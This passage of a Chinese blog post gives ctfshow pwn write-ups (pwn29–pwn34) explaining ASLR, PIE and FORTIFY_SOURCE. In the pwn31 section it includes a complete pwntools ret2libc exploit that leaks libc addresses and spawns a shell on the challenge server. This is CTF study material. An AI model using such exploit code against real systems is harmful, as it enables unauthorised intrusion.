class="line">- 部分无效：如果程序中存在信息泄露漏洞，攻击者仍然可能通过泄露的地址信息绕过ASLR。</span><br><span class="line"></span><br><span class="line">检查和启用ASLR</span><br><span class="line"></span><br><span class="line">在Linux系统上，可以通过检查`/proc/sys/kernel/randomize_va_space`文件来确定ASLR是否启用。</span><br><span class="line"></span><br><span class="line">0：表示 ASLR 被禁用。在这种情况下，进程的地址空间将不会随机化，各个组件的地址位置将是固定的。</span><br><span class="line"></span><br><span class="line">1：表示 ASLR 已启用，但只会对共享库的地址进行随机化。即在每次运行时，共享库的加载地址会发生变化，而进程的栈、堆和代码段的地址位置仍然是固定的。</span><br><span class="line"></span><br><span class="line">2：表示 ASLR 已启用，对进程的地址空间中的所有组件（包括栈、堆、共享库和代码段）进行完全随机化。这是最安全的设置，因为每次运行时，进程的所有组件的地址位置都会发生变化。</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">要启用或调整ASLR，可以编辑该文件（需要root权限）：</span><br><span class="line"></span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">ASLR 是现代操作系统中常见的安全防护措施之一，与其他技术如DEP（数据执行保护）、堆栈保护等一起使用，可以显著提高系统的安全性。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h4><p>开启了PIE的elf，就是让你看看开启了pie的elf长什么样，了解一下PIE这个知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PIE（Position Independent Executable）是一种编程技术，使得生成的可执行文件在内存中的加载地址可以是动态的，而不是固定的。这种技术配合ASLR（Address Space Layout Randomization）可以显著增强系统的安全性，防止攻击者通过已知的地址进行攻击。</span><br><span class="line"></span><br><span class="line">PIE的工作原理</span><br><span class="line"></span><br><span class="line">PIE的基本原理是生成位置无关代码（Position Independent Code，PIC）。位置无关代码中的所有内存引用都使用相对地址而不是绝对地址，这样无论代码被加载到哪个地址都能正常工作。具体来说：</span><br><span class="line"></span><br><span class="line">1. 编译时：编译器生成位置无关的机器代码，使用相对地址进行内存访问。</span><br><span class="line">2. 链接时：链接器生成位置无关的可执行文件（PIE）。</span><br><span class="line">3. 运行时：加载器可以将PIE文件加载到内存中的任何地址，而无需重定位。</span><br><span class="line"></span><br><span class="line">PIE的优点</span><br><span class="line"></span><br><span class="line">- 增强安全性：PIE配合ASLR可以使每次程序运行时，其代码段、数据段、堆和栈等部分的内存地址都不同，从而增加了攻击者猜测地址的难度。</span><br><span class="line">- 支持共享库：位置无关代码可以方便地被多个进程共享，从而节省内存。</span><br><span class="line"></span><br><span class="line">PIE的缺点</span><br><span class="line"></span><br><span class="line">- 性能开销：位置无关代码的运行效率可能稍低于绝对地址代码，因为需要通过相对地址进行内存访问。</span><br><span class="line">- 编译复杂性：生成PIE需要编译器和链接器的支持，并且可能增加编译时间。</span><br><span class="line"></span><br><span class="line">检查可执行文件是否启用了PIE</span><br><span class="line"></span><br><span class="line">在Linux系统上，可以使用`readelf`或`objdump`命令检查可执行文件是否启用了PIE。</span><br><span class="line"></span><br><span class="line">readelf -h your_executable | grep &quot;Type&quot;</span><br><span class="line"></span><br><span class="line">如果输出中包含`DYN`类型（而不是`EXEC`），则说明启用了PIE。</span><br><span class="line"></span><br><span class="line">objdump -p your_executable | grep &quot;PIE&quot;</span><br><span class="line"></span><br><span class="line">编译时启用PIE</span><br><span class="line">在编译时，可以使用`-fPIC`（生成位置无关代码）和`-pie`（生成位置无关可执行文件）选项启用PIE。</span><br><span class="line">gcc -fPIC -pie -o your_executable your_source.c</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">PIE通过生成位置无关的可执行文件，使得程序在内存中的加载地址可以动态变化，配合ASLR可以显著提升系统的安全性，防止内存地址被攻击者猜测和利用。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h4><p>和pwn25是类似的，使用pwn25的脚本就可以轻松拿下，只需要修改端口和elf文件即可</p>
+<h4 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h4><p>开启了aslr和pie也可能被hack，实际上是因为你自己print了main的地址吧？？？</p>
+<p>所以线索就是这个它自己print出来的地址，通过这个地址可以计算其他函数地址的真实地址，因为各个函数的地址是相对偏移的。</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240628173622874.png" alt="image-20240628173622874"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240628173937331.png" alt="image-20240628173937331"></p>
+<p>这里需要特别注意的是，在ctfshow的运行中，最后有一个mov操作，把[ebp+var_4]的位置的值赋给ebx，var_4在ctfshow函数的开头已经定义了是-4，所以这里要保存这个位置的值，</p>
+<table>
+<thead>
+<tr>
+<th>栈结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>（高位地址）</td>
+</tr>
+<tr>
+<td>main栈</td>
+</tr>
+<tr>
+<td>ctfshow栈</td>
+</tr>
+<tr>
+<td>read栈</td>
+</tr>
+<tr>
+<td>参数1</td>
+</tr>
+<tr>
+<td>参数2</td>
+</tr>
+<tr>
+<td>参数3 ——1</td>
+</tr>
+<tr>
+<td>call read的下一条指令的地址 ——2</td>
+</tr>
+<tr>
+<td>当前ebp ——3</td>
+</tr>
+<tr>
+<td>ebx (ebp-4h)——4</td>
+</tr>
+<tr>
+<td>buf (ebp-88h)——5</td>
+</tr>
+<tr>
+<td>当前esp</td>
+</tr>
+<tr>
+<td>（低位地址）</td>
+</tr>
+</tbody></table>
+<p>buf除了ebx之外全部覆盖成a，ebx覆盖为got表的地址，当前ebp也覆盖成a，下一条指令地址为plt表中puts的地址（偏移过后），参数3覆盖为main函数的地址，参数2覆盖为got表中puts的地址（偏移过后）</p>
+<p>已知在内存中的main的地址，再读取elf中main本来的地址，就可以计算出main函数在程序运行时地址的偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28165&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn31&quot;)  # 从附件中获取</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line"></span><br><span class="line">#读取main函数的真实地址，p.recv()可以读取进程的输入，strip()函数可以去除换行符，再将字符串转为数字</span><br><span class="line">main_real_addr = int(p.recv().strip(), 16)</span><br><span class="line">print(hex(main_real_addr))</span><br><span class="line">#计算运行时内存中的偏移基址</span><br><span class="line">base_addr = main_real_addr - elf.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">#读取elf文件中.got的地址</span><br><span class="line">got_section = elf.get_section_by_name(&#x27;.got&#x27;)</span><br><span class="line">got_address = got_section.header[&#x27;sh_addr&#x27;] + base_addr</span><br><span class="line">print(&quot;.got section address:&quot;, hex(got_address))</span><br><span class="line"></span><br><span class="line">#计算运行时内存中puts函数的地址</span><br><span class="line">puts_plt = base_addr + elf.symbols[&#x27;puts&#x27;]</span><br><span class="line">puts_got = base_addr + elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">#生成payload</span><br><span class="line">payload = (offset-0x4-0x4)*b&#x27;a&#x27; + p32(got_address) + 0x4*b&#x27;a&#x27;</span><br><span class="line">payload += p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 跟ret2lib一样，得到puts的地址之后寻找匹配的libc库</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(system_addr)+0x4*b&#x27;a&#x27;+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h4><p>题目提示：FORTIFY_SOURCE&#x3D;0，也就是不检查是否栈溢出，在反汇编的代码中也可以看到有一个undefined函数</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240628211222993.png" alt="image-20240628211222993"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240628211242732.png" alt="image-20240628211242732"></p>
+<p>所以只需要输入多几个参数就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwnme 1 1 1 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gcc的fortify选项（检查是否存在栈溢出，替换不安全的函数）</span><br><span class="line"></span><br><span class="line">Fortify Source 是 GCC 和 GLIBC 提供的一个安全特性，用于在编译时和运行时增加缓冲区溢出检测，从而提高程序的安全性。它通过替换某些标准库函数（如 strcpy、sprintf 等）为更安全的版本来实现。</span><br><span class="line"></span><br><span class="line">原理</span><br><span class="line">Fortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy、memset等函数自动替换成相应的__strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。</span><br><span class="line"></span><br><span class="line">FORTIFY_SOURCE机制对格式化字符串有两个限制：</span><br><span class="line"></span><br><span class="line">(1)包含%n的格式化字符串不能位于程序内存中的可写地址；</span><br><span class="line"></span><br><span class="line">(2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。</span><br><span class="line"></span><br><span class="line">启用 Fortify Source</span><br><span class="line">在编译 C 或 C++ 程序时，可以通过以下编译选项启用 Fortify Source：</span><br><span class="line"></span><br><span class="line">FORTIFY_SOURCE=0: 这是Fortify Source功能的默认级别，也就是禁用状态。</span><br><span class="line"></span><br><span class="line">FORTIFY_SOURCE=1: 这是第一个启用级别。如果编译器在编译时检测到潜在的缓冲区溢出或其他内存错误，它将生成一个运行时检查的警告，但程序仍然会继续执行。例如，会将strcpy替换为__strcpy_chk，memcpy替换为__memcpy_chk等。</span><br><span class="line"></span><br><span class="line">FORTIFY_SOURCE=2: 这是最高级别的启用。如果编译器在编译时检测到潜在的缓冲区溢出或内存错误，它将生成一个运行时检查的错误，并且程序的执行将被终止。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到ida反汇编出来的代码不一样了，strcpy被替换为了__strcry_chk，memcpy被替换为了__memcpy_chk，但是flag还是很容易就可以获取的，可见目的并不在于获得flag，而是体验不同的fortify级别的不同在哪里</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到代码又出现了不同，print被替换为了__print_chk，undefined之前的if也消失了，但是获取flag的方式还是一样的</span><br></pre></td></tr></table></figure>
+
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The source code of these three programs is the same, and the results of turning on different levels of protection are understood</span><br><span class="line"></span><br><span class="line">You should understand the role of these protections!But don&#x27;t just get a flag</span><br><span class="line">(copy一下pwn32里面的原话)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://linux.cn/article-15264-1.html</span><br><span class="line">https://www.cnblogs.com/VxerLee/p/16393508.html</span><br><span class="line">https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm</span><br><span class="line">https://www.cnblogs.com/bandaoyu/p/16752746.html(fork函数解析)</span><br><span class="line">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html(got和plt解析，暂时看得不是很懂，后面再看看)</span><br><span class="line">https://www.cnblogs.com/clover-toeic/p/3755401.html(调用栈分析1)</span><br><span class="line">https://www.cnblogs.com/clover-toeic/p/3756668.html(调用栈分析2)</span><br><span class="line">https://www.cnblogs.com/yanghong-hnu/p/4705755.html(什么是.bss.text.data)</span><br><span class="line">https://blog.csdn.net/m0_64180167/article/details/130449602(elf文件的格式)</span><br><span class="line">https://www.cnblogs.com/from-zero/p/13300396.html(ida远程调试)</span><br><span class="line">https://www.cnblogs.com/bunner/p/14436507.html(ida远程)</span><br><span class="line">https://cloud.tencent.com/developer/user/7648136(这个作者写的pwn入门还不错)</span><br><span class="line">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc(ctfwiki-pwn-rop)</span><br><span class="line">https://blog.csdn.net/weixin_63576152/article/details/132030376(pwn5-pwn34wp)</span><br><span class="line">https://blog.csdn.net/weixin_52635170/article/details/131304799(pwn29-pwn31wp,pwn31写得不错)</span><br><span class="line">https://www.cnblogs.com/yidianhan/p/13996928.html(gcc的安全选项)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">zx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/06/28/pwn0-34/">http://example.com/2024/06/28/pwn0-34/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">zx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/05/08/sm3%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="sm3长度拓展攻击"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sm3长度拓展攻击</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn0"><span class="toc-number">1.</span> <span class="toc-text">pwn0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn1"><span class="toc-number">2.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn2"><span class="toc-number">3.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn3"><span class="toc-number">4.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn4"><span class="toc-number">5.</span> <span class="toc-text">pwn4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn5"><span class="toc-number">6.</span> <span class="toc-text">pwn5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn6-12"><span class="toc-number">7.</span> <span class="toc-text">pwn6-12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn13"><span class="toc-number">8.</span> <span class="toc-text">pwn13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn14"><span class="toc-number">9.</span> <span class="toc-text">pwn14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn15"><span class="toc-number">10.</span> <span class="toc-text">pwn15</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#nasm%E7%BC%96%E8%AF%91"><span class="toc-number">10.1.</span> <span class="toc-text">nasm编译</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E5%B0%8F%E7%9F%A5%E8%AF%86%E2%80%93linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">10.1.1.</span> <span class="toc-text">汇编小知识–linux系统调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn16"><span class="toc-number">11.</span> <span class="toc-text">pwn16</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">11.0.1.</span> <span class="toc-text">gcc编译器小知识</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x86-64%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">11.1.</span> <span class="toc-text">x86-64小知识</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn17"><span class="toc-number">12.</span> <span class="toc-text">pwn17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn18"><span class="toc-number">13.</span> <span class="toc-text">pwn18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn19"><span class="toc-number">14.</span> <span class="toc-text">pwn19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn20"><span class="toc-number">15.</span> <span class="toc-text">pwn20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn21"><span class="toc-number">16.</span> <span class="toc-text">pwn21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn22"><span class="toc-number">17.</span> <span class="toc-text">pwn22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn23"><span class="toc-number">18.</span> <span class="toc-text">pwn23</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#readelf%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">18.1.</span> <span class="toc-text">readelf小技巧</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn24"><span class="toc-number">19.</span> <span class="toc-text">pwn24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn25"><span class="toc-number">20.</span> <span class="toc-text">pwn25</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn26-28"><span class="toc-number">21.</span> <span class="toc-text">pwn26-28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn29"><span class="toc-number">22.</span> <span class="toc-text">pwn29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn30"><span class="toc-number">23.</span> <span class="toc-text">pwn30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn31"><span class="toc-number">24.</span> <span class="toc-text">pwn31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn32"><span class="toc-number">25.</span> <span class="toc-text">pwn32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn33"><span class="toc-number">26.</span> <span class="toc-text">pwn33</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn34"><span class="toc-number">27.</span> <span class="toc-text">pwn34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">28.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reference"><span class="toc-number">29.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/28/pwn0-34/" title="pwn0-34">pwn0-34</a><time datetime="2024-06-28T13:32:57.000Z" title="发表于 2024-06-28 21:32:57">2024-06-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/08/sm3%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="sm3长度拓展攻击">sm3长度拓展攻击</a><time datetime="2024-05-08T02:50:45.000Z" title="发表于 2024-05-08 10:50:45">2024-05-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/29/java.cc3/" title="java反序列化cc3">java反序列化cc3</a><time datetime="2024-04-29T00:59:22.000Z" title="发表于 2024-04-29 08:59:22">2024-04-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/23/DASCTF-%C3%97-GFCTF-web-misc/" title="DASCTF × GFCTF-web,misc">DASCTF × GFCTF-web,misc</a><time datetime="2024-04-23T07:20:29.000Z" title="发表于 2024-04-23 15:20:29">2024-04-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/30/java.cc1/" title="java反序列化cc1">java反序列化cc1</a><time datetime="2024-03-30T08:54:20.000Z" title="发表于 2024-03-30 16:54:20">2024-03-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By zx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
